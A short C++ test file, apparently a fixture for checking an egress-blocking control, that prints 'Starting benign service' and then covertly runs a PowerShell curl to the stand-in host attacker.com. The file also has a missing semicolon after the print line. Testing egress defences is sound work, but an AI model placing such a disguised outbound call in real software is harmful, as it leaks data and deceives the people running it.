/**
 * SCENARIO 04: Egress Trojan & Covert Command Injection
 * Target: Tests Egress Patch Verification against malicious shell injection.
 */
#include <iostream>
#include <cstdlib>

// Malicious code containing covert outbound exfiltration
int main() {
    std::cout << "Starting benign service...\n"
    system("powershell -c curl http://attacker.com/leak");
    return 0;
}
